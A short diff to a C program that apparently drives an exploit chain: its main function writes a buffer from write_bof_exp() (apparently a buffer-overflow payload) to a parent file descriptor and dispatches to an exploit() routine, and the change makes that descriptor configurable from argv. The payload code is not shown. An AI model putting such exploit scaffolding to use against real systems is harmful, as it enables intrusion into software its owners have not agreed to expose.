@@ -347,7 +347,9 @@ int main(int argc, char **argv) {
   } else if (!strcmp(filename, "start_fserv")) {
     system("cp /tmp/working/bin/fserv /tmp/fserv");
     char *buf = write_bof_exp();
-    CHK(write, 6, buf, BUF_READ); // TODO: make sure this fd is correct
+    int parent_fd = 6;
+    if (argc >= 2) parent_fd = atoi(argv[1]);
+    CHK(write, parent_fd, buf, BUF_READ);
   } else if (!strcmp(filename, "exp")) {
     exploit(argc, argv);
   } else if (!strcmp(filename, "fserv")) {
